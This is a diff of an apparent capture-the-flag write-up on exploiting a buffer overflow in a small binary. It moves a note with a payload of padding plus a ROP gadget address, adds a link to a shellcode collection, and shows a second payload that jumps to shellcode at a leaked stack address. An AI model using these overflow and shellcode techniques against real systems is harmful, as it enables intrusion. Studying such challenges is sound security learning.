@@ -19,10 +19,13 @@ It depends on the number before to make a move. E.g: the number before first ins
 
 The program lets you type 60 bytes, but it only accepts 20 bytes. Therefore, you can see maybe it has buffer overflow here.
 
-First payload I use buffer overflow to make it returns to ROP gadget (0x08048087). And then it will print out esp address in stack. Having that address, I can put the shellcode into that.
+First payload I use buffer overflow to make it returns to ROP gadget (0x08048087).
+{: .box-note}
+**Note:** Payload 1: "aaaaaaaaaaaaaaaaaaaa\x87\x80\x04\x08"
+And then it will print out esp address in stack. Having that address, I can put the shellcode into that.
 
 
-\[About shellcode]
+\[About shellcode] You can find shellcode at [here](http://shell-storm.org/shellcode/).
 
 Source code for pwn:
 {% highlight python linenos %}
@@ -46,8 +49,7 @@ from pwn import *
   conn.close()
 {% endhighlight %}
 
-{: .box-note}
-**Note:** Payload 1: "aaaaaaaaaaaaaaaaaaaa\x87\x80\x04\x08"
+
 
 {: .box-note}
 **Note:** Payload 2: 'A' * 20 + p32(esp_add + 20) + shellcode
